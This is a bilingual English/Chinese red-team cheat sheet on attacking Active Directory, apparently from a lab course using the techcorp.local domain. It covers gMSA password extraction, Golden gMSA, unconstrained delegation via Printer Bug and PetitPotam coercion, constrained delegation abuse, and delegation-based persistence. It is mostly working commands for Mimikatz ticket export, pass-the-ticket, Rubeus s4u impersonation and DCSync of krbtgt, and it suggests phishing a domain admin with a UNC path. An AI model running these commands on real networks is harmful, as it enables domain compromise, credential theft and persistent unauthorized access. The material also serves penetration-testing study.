# gMSA

- A group Managed Service Account (gMSA) provides automatic password management, SPN management and delegated administration for service accounts across multiple servers.（组管理的服务账户（gMSA）提供自动密码管理、SPN管理和跨多个服务器的服务账户的委托管理。）

- Use of gMSA is recommended to protect from Kerberoast type attacks!（建议使用gMSA以防止Kerberoast类型的攻击!）

- A 256 bytes random password is generated and is rotated every 30 days.（生成一个 256 字节的随机密码，每 30 天轮换一次）

- When an authorized user reads the attribute 'msds-ManagedPassword’ the gMSA password is computed.（ 当授权用户读取属性“msds-ManagedPassword”时，将计算 gMSA 密码。）

- Only explicitly specified principals can read the password blob. Even the Domain Admins can't read it by default.（只有明确指定的主体才能读取密码 blob。 默认情况下，即使是域管理员也无法阅读。。）

## 枚举

### msDS-GroupMSAMembership
ADModule
```
Get-ADServiceAccount -Filter *
```
PowerView
```
Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'
```

属性```msDS-GroupMSAMembership```(PrincipalsAllowedToRetrieveManagedPassword) 列出了可以读取 password blob。

使用ADModule
```
Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
```

### msDS-ManagedPassword

- The attribute 'msDS-ManagedPassword' stores the password blob in binary form of MSDS-MANAGEDPASSWORD_BLOB. The attribute 'msDS-ManagedPassword' stores the password blob in binary form of MSDS-MANAGEDPASSWORD_BLOB.（ 属性```msDS-ManagedPassword```以二进制的形式从``` MSDS-MANAGEDPASSWORD_BLOB```存储 password blob）

- Once we have compromised a principal that can read the blob. Use ADModule to read and DSInternals to compute NTLM hash（一旦我们拿到可以读取这个blob的主体，使用ADModule读取DSInternals来计算NTLM）

```
$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'

Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1

$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob

ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
```

-  The 'CurrentPassword' attribute in the $decodedpwd contains the clear-text password but cannot be typed!($decodedpwd 中的“CurrentPassword”属性包含明文密码)


# Golden gMSA

- gMSA password is calculated by leveraging the secret stored in KDS root key object.（gMSA 密码是通过利用存储在 KDS KDS root key object中的secret来计算的。）

- We need following attributes of the KDS root key to compute the Group Key Envelope (GKE)（我们需要 KDS root key 的以下属性来计算Group Key Envelope (GKE)）

```
– cn
– msKds-SecretAgreementParam
– msKds-RootKeyData
– msKds-KDFParam
– msKds-KDFAlgorithmID
– msKds-CreateTime
– msKds-UseStartTime
– msKds-Version
– msKds-DomainID
– msKds-PrivateKeyLength
– msKds-PublicKeyLength
– msKds-SecretAgreementAlgorithmID
```

• Once we compute the GKE for the associated KDS root key we can generate the password offline.（一旦我们为相关的KDS 根密钥计算了GKE，我们就可以离线生成密码。）

• Only privilege accounts such as Domain Admins, Enterprise Admins or SYSTEM can retrieve the KDS root key.（只有域管理员、Enterprise Admins或SYSTEM等特权帐户才能检索 KDS 根密钥。）

• Once the KDS root key is compromised we can’t protect the associated gMSAs accounts.（一旦 KDS 根密钥被泄露，我们就无法保护关联的 gMSA 帐户。）

• Golden gMSA can be used to retrieved the information of gMSA account, KDS root key and generate the password offline.（Golden gMSA 可用于检索gMSA 帐户信息、KDS 根密钥和离线生成密码）

# Delegation

两种委托：

- Unconstrained Delegation（无约束委派）：可以委派任何计算机的任何服务

- Constrained Delegation（约束委派）：只可以委派特定计算机的特定服务


## Unconstrained Delegation（无约束委派）

枚举

使用 PowerView枚举无约束委派的电脑
```
Get-DomainComputer -UnConstrained  
```

使用ActiveDirectory module
```
Get-ADComputer -Filter {TrustedForDelegation -eq $True}  //无约束委派电脑


Get-ADUser -Filter {TrustedForDelegation -eq $True}   //无约束委派用户
```

一旦使得诸如DA这样的高权限用户访问无约束委派的计算机，可以使用下面命令导出DA的tgt
```
Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
```

复用上面得到tgt，使用ptt获得DA权限
```
Invoke-Mimikatz –Command '"kerberos::ptt ticket.kirbi"'
```

如何使得DA访问无约束委派的电脑？

有两种方法：

1. 是通过钓鱼邮件诱使DA访问带有unc路径的地址（```\\192.168.1.1\c$\any```）

2. Printer Bug


## Printer Bug

Printer Bug的前提是目标机器运行了Spooler服务

两个工具可以执行Printer Bug攻击

### [MS-RPRN.exe](https://github.com/leechristensen/SpoolSample)

1. 在无约束委派机器（这里是us-web）上运行Rubeus监听
```
.\Rubeus.exe monitor /interval:5
```

2.  在无约束委派机器上强制DC向其认证
```
.\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
```

### [PetitPotam.exe](https://github.com/topotam/PetitPotam)

1. 在无约束委派机器（这里是us-web）上运行Rubeus监听
```
.\Rubeus.exe monitor /interval:5
```

2.  在无约束委派机器上强制DC向其认证
```
.\PetitPotam.exe us-web us-dc
```

## 利用

1. 使用Rubeus ptt
```
Rubeus.exe ptt /tikcet:
```

2. 使用mimikatz ptt

制作票据
```
[IO.File]::WriteAllBytes("C:\AD\Tools\USDC.kirbi",
[Convert]::FromBase64String("ticket_from_Rubeus_monitor"))
```
ptt
```
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\USDC.kirbi"'
```

3. DCSync
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```

# Constrained Delegation（约束委派）

 Allows access only to specified services on specified computers as a user.（只允许以用户身份访问指定计算机上的指定服务）

• To impersonate the user, Service for User (S4U) extension is used which provides two extensions:（为了模拟用户，使用 Service for User (S4U) 扩展，它提供了两个扩展）

− Service for User to Proxy (S4U2proxy) - Allows a service to obtain a TGS to a second service (controlled by SPNs on msDs-AllowedToDelegateTo) on behalf of a user.（用户到代理服务 (S4U2proxy) - 允许服务代表用户获取第二个服务的 TGS（由 msDs-AllowedToDelegateTo 上的 SPN 控制）

− Service for User to Self (S4U2self) - Allows a service (must have TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) to obtain a forwardable TGS to itself on behalf of a user (no actual Kerberos authentication by user takes place). Used in Protocol Transition i.e. when user authenticates with non-Kerberos authentication.（Service for User to Self (S4U2self) - 允许服务（必须具有 TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION）代表用户获取可转发的 TGS 给自己（用户不会进行实际的 Kerberos 身份验证）。 用于协议转换，即当用户使用非 Kerberos 身份验证进行身份验证时）





• SeEnableDelegation privileges are needed to configure Constrained Delegation.（配置约束性授权需要SeEnableDelegation权限）

• Two ways to configure constrained delegation:（有两种方法可以配置约束性委托。）

- Kerberos only: Kerberos authentication is needed for the service to delegate.（仅限Kerberos。服务需要Kerberos认证来进行委托。）

- Protocol transition: Regardless of authentication the service can delegate.（协议转换。无论认证如何，服务都可以进行委托。）


## 枚举

使用PowerView
```
Get-DomainUser –TrustedToAuth

Get-DomainComputer –TrustedToAuth
```

使用ActiveDirectory module
```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

## 利用

这里是利用sname字段不受保护，本来是委托了A服务的票据，可以改成为委托B服务

### 方法1（不推荐）
使用Kekeo请求一个tgs
```
tgs::s4u /tgt:TGT_appsvc@US.TECHCORP.LOCAL_krbtgt~us.techcorp.local@US.TECHCORP.LOCAL.kirbi /user:Administrator /service:CIFS/us-mssql.us.techcorp.local|HTTP/us-mssql.us.techcorp.local
```
（这里我觉得应该是使用工具手动修改sname..）

使用mimikatz ptt
```
Invoke-Mimikatz '"kerberos::ptt TGS_Administrator@US.TECHCORP.LOCAL_HTTP~us-mssql.us.techcorp.local@US.TECHCORP.LOCAL_ALT.kirbi"'
```
执行命令
```
Invoke-Command -ScriptBlock{whoami} -ComputerName us-mssql.us.techcorp.local
```

### 方法2（推荐）
使用Rubeus
```
Rubeus.exe s4u /user:appsvc /rc4:1D49D390AC01D568F0EE9BE82BB74D4C /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt
```
这里：
/impersonateuser ：模拟的用户
/msdsspn ： 原本委托的服务
/altservice ： 模拟的服务

然后
```
winrs -r:us-mssql cmd.exe
```


**注意**

- Note that the msDS-AllowedToDelegateTo is the user account flag which controls the services to which a user account has access to.（请注意，msDS-AllowedToDelegateTo 是用户帐户标志，用于控制用户帐户有权访问的服务。）

- This means, with enough privileges, it is possible to access any service from a user – a neat persistence trick.（这意味着，只要有足够的权限，就可以访问用户的任何服务——一个巧妙的持久化技巧。）

- Enough privileges? – SeEnableDelegationPrivilege on the DC and full rights on the target user - default for Domain Admins and Enterprise Admins.（足够的特权？ – DC 上的 SeEnableDelegationPrivilege 和目标用户的完整权限 - 域管理员和企业管理员的默认设置。）

- That is, we can force set 'Trusted to Authenticate for Delegation' and ms-DS-AllowedToDelegateTo on a user (or create a new user - which is more noisy) and abuse it later.（也就是说，我们可以对用户强制设置 'Trusted to Authenticate for Delegation' 和 ms-DS-AllowedToDelegateTo（或创建一个新用户 - 噪音更大），然后再滥用它。）



# Persistence（域持久性） - msDS-AllowedToDelegateTo

## 设置
使用PowerView
```
Set-DomainObject -Identity devuser -Set @{serviceprincipalname='dev/svc'}

Set-DomainObject -Identity devuser -Set @{"msds-allowedtodelegateto"="ldap/us-dc.us.techcorp.local"}

Set-DomainObject -SamAccountName devuser1 -Xor @{"useraccountcontrol"="16777216"}

Get-DomainUser –TrustedToAuth
```

使用AD module
```
Set-ADUser -Identity devuser -ServicePrincipalNames @{Add='dev/svc'}

Set-ADUser -Identity devuser -Add @{'msDS-AllowedToDelegateTo'= @('ldap/us-dc','ldap/us-dc.us.techcorp.local')} -Verbose

Set-ADAccountControl -Identity devuser -TrustedToAuthForDelegation $true

Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

## Abuse using Kekeo
```
kekeo# tgt::ask /user:devuser /domain:us.techcorp.local /password:Password@123!

kekeo# tgs::s4u /tgt:TGT_devuser@us.techcorp.local_krbtgt~us.techcorp.local@us.techcorp.local.kirbi /user:Administrator@us.techcorp.local /service:ldap/us-dc.us.techcorp.local

Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@us.techcorp.local@us.techcorp.local_ldap~us-dc.us.techcorp.local@us.techcorp.local.kirbi"'

Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```

Abuse using Rubeus
```
Rubeus.exe hash /password:Password@123! /user:devuser /domain:us.techcorp.local

Rubeus.exe s4u /user:devuser /rc4:539259E25A0361EC4A227DD9894719F6 /impersonateuser:administrator /msdsspn:ldap/us-dc.us.techcorp.local /domain:us.techcorp.local /ptt

C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```



